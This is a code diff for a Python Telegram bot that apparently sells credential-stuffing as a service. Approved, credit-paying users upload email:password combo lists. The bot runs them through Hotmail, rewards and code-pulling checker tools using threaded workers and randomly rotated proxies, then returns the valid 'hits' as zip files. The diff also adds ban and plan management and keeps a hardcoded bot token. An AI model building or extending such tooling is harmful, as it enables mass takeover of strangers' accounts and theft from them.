@@ -5,7 +5,8 @@ import asyncio
 import time
 import shutil
 import glob
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
+import random
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
 from telegram.constants import ParseMode
 
@@ -19,7 +20,6 @@ import database
 
 # Authorized Admin ID
 ADMIN_ID = 5944410248
-# Fallback token if env var is missing
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
 
 # Enable logging
@@ -42,14 +42,14 @@ def get_header(title):
 
 def restricted(func):
     async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        if not update.effective_user:
-            return
+        if not update.effective_user: return
         user_id = update.effective_user.id
+        if database.is_banned(user_id):
+            await update.message.reply_text("🚫 **You are BANNED.**")
+            return
         if not database.is_approved(user_id):
             await update.message.reply_text(
-                f"🚫 **Access Denied**\n\nYou are not authorized to use this bot. "
-                f"Please contact the Administrator to request access.\n\n"
-                f"Your ID: `{user_id}`{get_footer()}",
+                f"🚫 **Access Denied**\n\nContact Admin [`{ADMIN_ID}`] for access.\nID: `{user_id}`{get_footer()}",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
@@ -58,14 +58,9 @@ def restricted(func):
 
 def admin_only(func):
     async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        if not update.effective_user:
-            return
-        user_id = update.effective_user.id
-        if not database.is_admin(user_id):
-            await update.message.reply_text(
-                f"❌ **Admin Only**\n\nThis command is restricted to the bot owner.{get_footer()}",
-                parse_mode=ParseMode.MARKDOWN
-            )
+        if not update.effective_user: return
+        if not database.is_admin(update.effective_user.id):
+            await update.message.reply_text(f"❌ **Admin Only**{get_footer()}", parse_mode=ParseMode.MARKDOWN)
             return
         return await func(update, context, *args, **kwargs)
     return wrapped
@@ -77,6 +72,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     credits = database.get_credits(user_id)
     settings = database.get_user_settings(user_id)
+    plan = database.get_plan(user_id)
 
     keyboard = [
         [InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'),
@@ -91,422 +87,242 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     msg = (
         f"{get_header('TOOLBOT DASHBOARD')}"
-        f"Welcome back! Your account is active.\n\n"
+        f"🏅 **Plan:** `{plan}`\n"
         f"💳 **Credits:** `{credits}`\n"
         f"🧵 **Threads:** `{settings['threads']}`\n"
-        f"🌐 **Proxy:** `{settings['proxy'] if settings['proxy'] else 'None'}`\n\n"
+        f"🌐 **Proxy File:** `{'SET ✅' if settings['proxy_file'] else 'NOT SET ❌'}`\n\n"
         f"Select a tool to begin:{get_footer()}"
     )
     await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
 
 @restricted
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    is_admin = database.is_admin(user_id)
-
     help_text = (
         f"{get_header('HELP & COMMANDS')}"
         f"/start - Dashboard\n"
-        f"/threads <num> - Set execution threads\n"
-        f"/proxy <url> - Set proxy (http://user:pass@host:port)\n"
-        f"/proxy none - Remove proxy\n"
-        f"/me - Check credits & status\n"
+        f"/me - Profile & Settings\n"
+        f"/threads <num> - Set threads (max 50)\n"
         f"/help - Show this message\n\n"
-        f"**Limits:**\n"
-        f"• Max 5 threads without proxy.\n"
-        f"• Max 100 threads with proxy."
+        f"**Thread Limits:**\n"
+        f"• Max **5 threads** without proxy file.\n"
+        f"• Max **50 threads** with proxy file.\n\n"
+        f"**File Types:**\n"
+        f"After uploading a .txt file, select if it's a **Combo** or **Proxy** file."
     )
-
-    if is_admin:
-        help_text += (
-            f"\n\n**Admin Commands:**\n"
-            f"/approve `<id>` - Approve a user\n"
-            f"/add_credits `<id> <amount>` - Give credits\n"
-            f"/users - List all users"
-        )
-
-    help_text += get_footer()
-    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
-
-@restricted
-async def threads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    settings = database.get_user_settings(user_id)
-
-    if not context.args:
-        await update.message.reply_text(f"🧵 **Current Threads:** `{settings['threads']}`\nUsage: `/threads <num>`")
-        return
-
-    try:
-        num = int(context.args[0])
-        if num < 1: raise ValueError
-
-        if not settings['proxy'] and num > 5 and not database.is_admin(user_id):
-            await update.message.reply_text("❌ **Thread Limit!**\n\nYou can only use max **5 threads** without a proxy.")
-            return
-
-        if num > 100 and not database.is_admin(user_id):
-            num = 100
-
-        database.update_user_settings(user_id, threads=num)
-        await update.message.reply_text(f"✅ **Threads updated to:** `{num}`")
-    except:
-        await update.message.reply_text("❌ Invalid number.")
-
-@restricted
-async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not context.args:
-        settings = database.get_user_settings(user_id)
-        proxy = settings['proxy'] if settings['proxy'] else "None"
-        await update.message.reply_text(f"🌐 **Current Proxy:** `{proxy}`\nUsage: `/proxy <url>` or `/proxy none`")
-        return
-
-    proxy_url = context.args[0].lower()
-    if proxy_url == 'none':
-        database.update_user_settings(user_id, proxy="")
-        # Also reset threads if they were > 5
-        settings = database.get_user_settings(user_id)
-        if settings['threads'] > 5 and not database.is_admin(user_id):
-             database.update_user_settings(user_id, threads=5)
-             await update.message.reply_text("✅ Proxy removed. Threads reset to 5.")
-        else:
-             await update.message.reply_text("✅ Proxy removed.")
-    else:
-        # Simple validation
-        if not (proxy_url.startswith('http') or proxy_url.startswith('socks')):
-             await update.message.reply_text("❌ Invalid proxy format. Use `http://...` or `socks5://...`")
-             return
-        database.update_user_settings(user_id, proxy=proxy_url)
-        await update.message.reply_text(f"✅ **Proxy updated to:** `{proxy_url}`")
+    if database.is_admin(update.effective_user.id):
+        help_text += "\n\n**Admin:** /approve /revoke /ban /unban /setplan /add_credits /users"
+    await update.message.reply_text(help_text + get_footer(), parse_mode=ParseMode.MARKDOWN)
 
 @restricted
 async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    credits = database.get_credits(user_id)
-    settings = database.get_user_settings(user_id)
-    status = "Admin" if database.is_admin(user_id) else "Approved User"
-
+    u = update.effective_user
     msg = (
         f"{get_header('USER PROFILE')}"
-        f"🆔 **User ID:** `{user_id}`\n"
-        f"🏅 **Status:** `{status}`\n"
-        f"💳 **Credits:** `{credits}`\n"
-        f"🧵 **Threads:** `{settings['threads']}`\n"
-        f"🌐 **Proxy:** `{settings['proxy'] if settings['proxy'] else 'None'}`{get_footer()}"
+        f"🆔 **ID:** `{u.id}`\n"
+        f"🏅 **Plan:** `{database.get_plan(u.id)}`\n"
+        f"💳 **Credits:** `{database.get_credits(u.id)}`\n"
+        f"🧵 **Threads:** `{database.get_user_settings(u.id)['threads']}`\n"
+        f"🌐 **Proxy File:** `{'SET ✅' if database.get_user_settings(u.id)['proxy_file'] else 'NOT SET ❌'}`{get_footer()}"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
-# --- Admin Handlers ---
+@restricted
+async def threads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text(f"🧵 **Threads:** `{database.get_user_settings(uid)['threads']}`")
+        return
+    try:
+        n = int(context.args[0])
+        if n < 1: raise ValueError
+        if not database.get_user_settings(uid)['proxy_file'] and n > 5 and not database.is_admin(uid):
+            await update.message.reply_text("❌ Max 5 threads without proxy file.")
+            return
+        if n > 50 and not database.is_admin(uid): n = 50
+        database.update_user_settings(uid, threads=n)
+        await update.message.reply_text(f"✅ Threads set to `{n}`.")
+    except: await update.message.reply_text("❌ Invalid number.")
+
+# --- Admin ---
 
 @admin_only
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        target_id = int(context.args[0])
-        database.set_approved(target_id, True)
-        await update.message.reply_text(f"✅ **User Approved**\n\nID `{target_id}` can now use the bot.", parse_mode=ParseMode.MARKDOWN)
-    except:
-        await update.message.reply_text("💡 **Usage:** `/approve <user_id>`", parse_mode=ParseMode.MARKDOWN)
+    try: database.set_approved(int(context.args[0]), True); await update.message.reply_text("✅ Approved.")
+    except: await update.message.reply_text("Usage: /approve <id>")
+
+@admin_only
+async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try: database.set_approved(int(context.args[0]), False); await update.message.reply_text("✅ Revoked.")
+    except: await update.message.reply_text("Usage: /revoke <id>")
+
+@admin_only
+async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try: database.ban_user(int(context.args[0])); await update.message.reply_text("✅ Banned.")
+    except: await update.message.reply_text("Usage: /ban <id>")
+
+@admin_only
+async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try: database.unban_user(int(context.args[0])); await update.message.reply_text("✅ Unbanned.")
+    except: await update.message.reply_text("Usage: /unban <id>")
+
+@admin_only
+async def setplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try: database.set_plan(int(context.args[0]), context.args[1]); await update.message.reply_text("✅ Plan set.")
+    except: await update.message.reply_text("Usage: /setplan <id> <plan>")
 
 @admin_only
 async def add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        target_id = int(context.args[0])
-        amount = int(context.args[1])
-        database.add_credits(target_id, amount)
-        await update.message.reply_text(f"💰 **Credits Added**\n\nAdded `{amount}` credits to `{target_id}`.", parse_mode=ParseMode.MARKDOWN)
-    except:
-        await update.message.reply_text("💡 **Usage:** `/add_credits <user_id> <amount>`", parse_mode=ParseMode.MARKDOWN)
+    try: database.add_credits(int(context.args[0]), int(context.args[1])); await update.message.reply_text("✅ Credits added.")
+    except: await update.message.reply_text("Usage: /add_credits <id> <amount>")
 
 @admin_only
 async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    all_users = database.get_all_users()
-    if not all_users:
-        await update.message.reply_text("📂 **No users registered.**", parse_mode=ParseMode.MARKDOWN)
-        return
+    all = database.get_all_users()
+    rep = f"{get_header('USERS')}"
+    for k, v in all.items():
+        rep += f"• `{k}` | {'✅' if v.get('approved') else '❌'}{' 🚫' if v.get('banned') else ''} | `{v.get('plan')}` | `{v.get('credits')}` cr\n"
+    await update.message.reply_text(rep, parse_mode=ParseMode.MARKDOWN)
 
-    report = f"{get_header('REGISTERED USERS')}"
-    for uid, data in all_users.items():
-        status = "✅" if data.get("approved") else "❌"
-        report += f"• ID: `{uid}` | {status} | `{data.get('credits', 0)}` cr | `{data.get('threads', 5)}` th\n"
-
-    await update.message.reply_text(report, parse_mode=ParseMode.MARKDOWN)
-
-# --- Message & Callback Handlers ---
+# --- Handlers ---
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query: return
-    await query.answer()
+    q = update.callback_query
+    if not q: return
+    await q.answer()
+    uid = q.from_user.id
+    if database.is_banned(uid) or not database.is_approved(uid): return
 
-    user_id = query.from_user.id
-    if not database.is_approved(user_id):
-        return
-
-    if query.data.startswith('tool_'):
-        tool = query.data.split('_')[1]
+    if q.data.startswith('tool_'):
+        tool = q.data.split('_')[1]
         context.user_data['selected_tool'] = tool
-        await query.edit_message_text(
-            text=f"{get_header(f'TOOL SELECTED: {tool.upper()}')}"
-                 f"Please upload your **.txt combo file** now.\n\n"
-                 f"Note: This will cost `1` credit.{get_footer()}",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]])
-        )
-    elif query.data == 'settings':
-        settings = database.get_user_settings(user_id)
-        msg = (
-            f"{get_header('SETTINGS')}"
-            f"🧵 **Threads:** `{settings['threads']}`\n"
-            f"🌐 **Proxy:** `{settings['proxy'] if settings['proxy'] else 'None'}`\n\n"
-            f"Use commands to change:\n"
-            f"• `/threads <num>`\n"
-            f"• `/proxy <url>`"
-        )
-        await query.edit_message_text(
-            text=msg,
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]])
-        )
-    elif query.data == 'profile':
-        credits = database.get_credits(user_id)
-        status = "Admin" if database.is_admin(user_id) else "Approved User"
-        await query.edit_message_text(
-            text=f"{get_header('USER PROFILE')}"
-                 f"🆔 **User ID:** `{user_id}`\n"
-                 f"🏅 **Status:** `{status}`\n"
-                 f"💳 **Credits:** `{credits}`{get_footer()}",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]])
-        )
-    elif query.data == 'back_to_start':
-        credits = database.get_credits(user_id)
-        settings = database.get_user_settings(user_id)
-        keyboard = [
-            [InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'),
-             InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')],
-            [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'),
-             InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')],
-            [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')],
-            [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
-             InlineKeyboardButton("👤 Profile", callback_data='profile')]
-        ]
-        await query.edit_message_text(
-            text=f"{get_header('TOOLBOT DASHBOARD')}"
-                 f"Select a tool below to begin execution:\n\n"
-                 f"💳 **Credits:** `{credits}`\n"
-                 f"🧵 **Threads:** `{settings['threads']}`{get_footer()}",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await q.edit_message_text(f"{get_header(f'TOOL: {tool.upper()}')}Upload your **.txt combo file** now.{get_footer()}", parse_mode=ParseMode.MARKDOWN)
+    elif q.data == 'settings':
+        s = database.get_user_settings(uid)
+        await q.edit_message_text(f"{get_header('SETTINGS')}🧵 Threads: `{s['threads']}`\n🌐 Proxy File: `{'SET' if s['proxy_file'] else 'NOT SET'}`\n\nUse `/threads <n>` to change threads.\nUpload a file and select 'Proxy File' to set proxies.{get_footer()}", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
+    elif q.data == 'profile':
+        msg = f"{get_header('PROFILE')}🆔 ID: `{uid}`\n🏅 Plan: `{database.get_plan(uid)}`\n💳 Credits: `{database.get_credits(uid)}`{get_footer()}"
+        await q.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
+    elif q.data == 'back_to_start':
+        s = database.get_user_settings(uid)
+        kb = [[InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'), InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')], [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'), InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')], [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')], [InlineKeyboardButton("⚙️ Settings", callback_data='settings'), InlineKeyboardButton("👤 Profile", callback_data='profile')]]
+        await q.edit_message_text(f"{get_header('DASHBOARD')}💳 Credits: `{database.get_credits(uid)}`\n🧵 Threads: `{s['threads']}`{get_footer()}", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    elif q.data.startswith('file_'):
+        ftype = q.data.split('_')[1]
+        fpath = context.user_data.get('last_uploaded_file')
+        if ftype == 'proxy':
+            database.update_user_settings(uid, proxy_file=fpath)
+            await q.edit_message_text(f"✅ **Proxy file saved.** Threads up to 50 allowed.{get_footer()}", parse_mode=ParseMode.MARKDOWN)
+        elif ftype == 'combo':
+            tool = context.user_data.get('selected_tool')
+            if not tool: await q.edit_message_text("❌ Select tool first."); return
+            if database.get_credits(uid) <= 0: await q.edit_message_text("❌ No credits."); return
+            database.deduct_credit(uid)
+            s = database.get_user_settings(uid)
+            st_msg = await q.edit_message_text(f"🚀 **Starting `{tool.upper()}`...**\nThreads: `{s['threads']}`\nProxy: `{'Using file ✅' if s['proxy_file'] else 'None ❌'}`\n⏳ _Loading..._", parse_mode=ParseMode.MARKDOWN)
+            threading.Thread(target=run_tool_async, args=(tool, fpath, q.message.chat_id, st_msg.message_id, context.application, s), daemon=True).start()
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.effective_user: return
-    user_id = update.effective_user.id
-    if not database.is_approved(user_id):
+async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if database.is_banned(uid) or not database.is_approved(uid): return
+    doc = update.message.document
+    if not doc or not doc.file_name.lower().endswith('.txt'):
+        await update.message.reply_text("❌ Upload a `.txt` file.")
         return
+    f = await context.bot.get_file(doc.file_id)
+    path = os.path.join(UPLOADS_DIR, f"{uid}_{int(time.time())}_{doc.file_name}")
+    await f.download_to_drive(path)
+    context.user_data['last_uploaded_file'] = path
+    kb = [[InlineKeyboardButton("📄 Combo File", callback_data='file_combo'), InlineKeyboardButton("🌐 Proxy File", callback_data='file_proxy')]]
+    await update.message.reply_text(f"📂 **File Received:** `{doc.file_name}`\nWhat is this for?", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
 
-    selected_tool = context.user_data.get('selected_tool')
-    if not selected_tool:
-        await update.message.reply_text("⚠️ **No tool selected.**\n\nPlease select a tool from the dashboard first.", parse_mode=ParseMode.MARKDOWN)
-        return
+# --- Engine ---
 
-    if database.get_credits(user_id) <= 0:
-        await update.message.reply_text("🚫 **Insufficient Credits**\n\nYou need at least `1` credit to run a tool.", parse_mode=ParseMode.MARKDOWN)
-        return
+def run_tool_async(tool, fpath, cid, mid, app, settings):
+    last_up = [0]
+    ival = 5
+    th = settings['threads']
+    pf = settings['proxy_file']
+    plist = []
+    if pf and os.path.exists(pf):
+        with open(pf, 'r') as f: plist = [l.strip() for l in f if l.strip()]
 
-    document = update.message.document
-    if not document or not document.file_name.lower().endswith('.txt'):
-        await update.message.reply_text("❌ **Invalid File**\n\nPlease upload a valid `.txt` combo file.", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    file = await context.bot.get_file(document.file_id)
-    file_path = os.path.join(UPLOADS_DIR, f"{user_id}_{int(time.time())}_{document.file_name}")
-    await file.download_to_drive(file_path)
-
-    settings = database.get_user_settings(user_id)
-
-    status_message = await update.message.reply_text(
-        f"🔄 **Initializing `{selected_tool.upper()}`...**\n"
-        f"File: `{document.file_name}`\n"
-        f"Threads: `{settings['threads']}`\n"
-        f"Proxy: `{settings['proxy'] if settings['proxy'] else 'None'}`\n\n"
-        f"🚀 _Starting engines..._",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-    # Deduct 1 credit
-    database.deduct_credit(user_id)
-
-    # Use application's loop to update Telegram from worker thread
-    threading.Thread(
-        target=run_tool_async,
-        args=(selected_tool, file_path, update.effective_chat.id, status_message.message_id, context.application, settings),
-        daemon=True
-    ).start()
-
-# --- Tool Execution Engine ---
-
-def run_tool_async(tool_name, file_path, chat_id, status_msg_id, application, user_settings):
-    last_update_time = [0]
-    update_interval = 5
-    threads = user_settings['threads']
-    proxy = user_settings['proxy']
-
-    def bot_callback(text):
-        now = time.time()
-        if now - last_update_time[0] < update_interval and "Finished" not in text and "Completed" not in text:
-            return
-        last_update_time[0] = now
-
-        asyncio.run_coroutine_threadsafe(
-            application.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=status_msg_id,
-                text=f"⚙️ **TOOL IN PROGRESS: {tool_name.upper()}**\n━━━━━━━━━━━━━━━━━━━━\n{text}{get_footer()}",
-                parse_mode=ParseMode.MARKDOWN
-            ),
-            application.loop
-        )
-
-    # Immediate start message
-    bot_callback("🚀 Execution started... Loading accounts.")
+    def callback(text):
+        if time.time() - last_up[0] < ival and "Finished" not in text and "Completed" not in text: return
+        last_up[0] = time.time()
+        asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(chat_id=cid, message_id=mid, text=f"⚙️ **PROGRESS: {tool.upper()}**\n━━━━━━━━━━━━━\n{text}{get_footer()}", parse_mode=ParseMode.MARKDOWN), app.loop)
 
     try:
-        results_path = None
-        if tool_name == 'flux':
-            parser = flux.ComboParser(file_path)
-            accounts = parser.parse()
-            if not accounts:
-                bot_callback("❌ No valid accounts found in file.")
-                return
-            settings = flux.Settings()
-            settings.set('max_threads', threads)
-            # flux has internal proxy manager, but we can try to inject if needed
-            scraper = flux.MultiPlatformScraper(accounts, settings, "All", log_callback=bot_callback)
-            scraper.check_all()
-            results_path = scraper.results_folder
-
-        elif tool_name == 'h':
-            checker = h.HotmailChecker(log_callback=bot_callback)
-            checker.run(file_path, num_threads=threads)
-            results_path = "Hotmail-Hits.txt"
-
-        elif tool_name == 'hit':
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                lines = [l.strip() for l in f.readlines() if ':' in l]
-            if not lines:
-                bot_callback("❌ No valid accounts found in file.")
-                return
-            stats = hit.LiveStats(len(lines), callback=bot_callback)
-            result_mgr = hit.EnhancedResultManager(f"bot_{int(time.time())}", "full")
-
-            def process_hit(line):
+        res_path = None
+        if tool == 'flux':
+            if plist:
+                 with open("proxies.txt", "w") as f:
+                      for p in plist: f.write(p + "\n")
+            p = flux.ComboParser(fpath); accs = p.parse()
+            if not accs: callback("❌ No accounts."); return
+            s = flux.Settings(); s.set('max_threads', th)
+            scr = flux.MultiPlatformScraper(accs, s, "All", log_callback=callback)
+            scr.check_all(); res_path = scr.results_folder
+        elif tool == 'h':
+            chk = h.HotmailChecker(log_callback=callback, proxies=plist)
+            chk.run(fpath, num_threads=th); res_path = "Hotmail-Hits.txt"
+        elif tool == 'hit':
+            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f: lines = [l.strip() for l in f if ':' in l]
+            if not lines: callback("❌ No accounts."); return
+            stats = hit.LiveStats(len(lines), callback=callback)
+            mgr = hit.EnhancedResultManager(f"bot_{int(time.time())}", "full")
+            def prc(line):
                 try:
-                    email, password = line.split(':', 1)
-                    checker = hit.UnifiedChecker(check_mode="full_enhanced")
-                    # Inject proxy if set
-                    if proxy:
-                         checker.session.proxies = {'http': proxy, 'https': proxy}
-                    res = checker.check(email.strip(), password.strip())
-                    stats.update(res["status"], res if res["status"] == "HIT" else None)
-                    if res["status"] == "HIT":
-                        result_mgr.save_hit(email, password, res)
+                    e, p = line.split(':', 1); c = hit.UnifiedChecker(check_mode="full_enhanced")
+                    if plist: pr = random.choice(plist); c.session.proxies = {'http': pr, 'https': pr}
+                    r = c.check(e.strip(), p.strip()); stats.update(r["status"], r if r["status"] == "HIT" else None)
+                    if r["status"] == "HIT": mgr.save_hit(e, p, r)
                     stats.print_live("full_enhanced")
                 except: pass
-
             from concurrent.futures import ThreadPoolExecutor
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                executor.map(process_hit, lines)
-            results_path = result_mgr.base_folder
+            with ThreadPoolExecutor(max_workers=th) as ex: ex.map(prc, lines)
+            res_path = mgr.base_folder
+        elif tool == 'p7':
+            p7.check_bulk(fpath, threads=th, proxy=random.choice(plist) if plist else None, callback=callback)
+            res_path = "Results"
+        elif tool == 'pullerv2':
+            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
+                 accs = [l.strip().split(':', 1) for l in f if ':' in l]
+            if not accs: callback("❌ No accounts."); return
+            if plist:
+                 with open("proxies.txt", "w") as f:
+                      for p in plist: f.write(p + "\n")
+            pullerv2.MAX_THREADS_FETCHER = th; pullerv2.MAX_THREADS_VALIDATOR = th
+            pullerv2.phase1_fetch_codes(accs, callback=callback)
+            pullerv2.phase2_validate_codes(accs, codes=None, callback=callback)
+            fs = glob.glob("validation_results_*")
+            if fs: res_path = max(fs, key=os.path.getmtime)
 
-        elif tool_name == 'p7':
-            p7.check_bulk(file_path, threads=threads, proxy=proxy, callback=bot_callback)
-            results_path = "Results"
-
-        elif tool_name == 'pullerv2':
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                accounts = []
-                for line in f:
-                    if ':' in line:
-                        accounts.append(line.strip().split(':', 1))
-            if not accounts:
-                bot_callback("❌ No valid accounts found in file.")
-                return
-            # pullerv2 has its own proxy manager in pullerv2.py, but it's hardcoded to read proxies.txt
-            # For simplicity, we just run it as is for now or could inject
-            pullerv2.MAX_THREADS_FETCHER = threads
-            pullerv2.MAX_THREADS_VALIDATOR = threads
-            pullerv2.phase1_fetch_codes(accounts, callback=bot_callback)
-            pullerv2.phase2_validate_codes(accounts, codes=None, callback=bot_callback)
-            results_folders = glob.glob("validation_results_*")
-            if results_folders:
-                results_path = max(results_folders, key=os.path.getmtime)
-
-        # Notify completion
-        asyncio.run_coroutine_threadsafe(
-            application.bot.send_message(chat_id=chat_id, text=f"✅ **Tool `{tool_name.upper()}` has finished!**\nSending results...", parse_mode=ParseMode.MARKDOWN),
-            application.loop
-        )
-
-        # Zip results if it's a folder
-        if results_path and os.path.exists(results_path):
-            final_file = results_path
-            if os.path.isdir(results_path):
-                zip_name = f"{results_path}_{int(time.time())}"
-                shutil.make_archive(zip_name, 'zip', results_path)
-                final_file = f"{zip_name}.zip"
-
-            # Send the file
-            asyncio.run_coroutine_threadsafe(
-                application.bot.send_document(
-                    chat_id=chat_id,
-                    document=open(final_file, 'rb'),
-                    caption=f"📦 **Results: {tool_name.upper()}**\n━━━━━━━━━━━━━━━━━━━━\nDone!{get_footer()}",
-                    parse_mode=ParseMode.MARKDOWN
-                ),
-                application.loop
-            )
-        else:
-            bot_callback("✅ Process finished, but no results file was generated.")
-
+        asyncio.run_coroutine_threadsafe(app.bot.send_message(chat_id=cid, text=f"✅ **Tool `{tool.upper()}` finished!**"), app.loop)
+        if res_path and os.path.exists(res_path):
+            final = res_path
+            if os.path.isdir(res_path):
+                shutil.make_archive(res_path, 'zip', res_path); final = f"{res_path}.zip"
+            asyncio.run_coroutine_threadsafe(app.bot.send_document(chat_id=cid, document=open(final, 'rb'), caption=f"📦 **Results: {tool.upper()}**{get_footer()}", parse_mode=ParseMode.MARKDOWN), app.loop)
+        else: callback("✅ Done, no results file.")
     except Exception as e:
-        logger.error(f"Error in {tool_name}: {e}", exc_info=True)
-        asyncio.run_coroutine_threadsafe(
-            application.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=status_msg_id,
-                text=f"❌ **Crash Error in `{tool_name.upper()}`**\n\n`{str(e)}`",
-                parse_mode=ParseMode.MARKDOWN
-            ),
-            application.loop
-        )
-
-# --- Main Entry Point ---
+        logger.error(f"Error {tool}: {e}")
+        asyncio.run_coroutine_threadsafe(app.bot.send_message(chat_id=cid, text=f"❌ **Error:** `{e}`"), app.loop)
 
 if __name__ == '__main__':
-    # Ensure initial admin is authorized
-    if not database.is_approved(ADMIN_ID):
-        database.set_approved(ADMIN_ID, True)
-
-    # Check for token
-    if not BOT_TOKEN or ":" not in BOT_TOKEN:
-        print("CRITICAL ERROR: No valid TELEGRAM_BOT_TOKEN provided.")
-        exit(1)
-
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    # Handlers
-    application.add_handler(CommandHandler('start', start))
-    application.add_handler(CommandHandler('help', help_command))
-    application.add_handler(CommandHandler('me', me_command))
-    application.add_handler(CommandHandler('threads', threads_command))
-    application.add_handler(CommandHandler('proxy', proxy_command))
-    application.add_handler(CommandHandler('approve', approve))
-    application.add_handler(CommandHandler('add_credits', add_credits))
-    application.add_handler(CommandHandler('users', users))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-
-    logger.info("Bot started successfully.")
-    application.run_polling()
+    if not database.is_approved(ADMIN_ID): database.set_approved(ADMIN_ID, True)
+    if not BOT_TOKEN or ":" not in BOT_TOKEN: exit(1)
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler('start', start))
+    app.add_handler(CommandHandler('help', help_command))
+    app.add_handler(CommandHandler('me', me_command))
+    app.add_handler(CommandHandler('threads', threads_command))
+    app.add_handler(CommandHandler('approve', approve))
+    app.add_handler(CommandHandler('revoke', revoke))
+    app.add_handler(CommandHandler('ban', ban))
+    app.add_handler(CommandHandler('unban', unban))
+    app.add_handler(CommandHandler('setplan', setplan))
+    app.add_handler(CommandHandler('add_credits', add_credits))
+    app.add_handler(CommandHandler('users', users))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
+    app.run_polling()
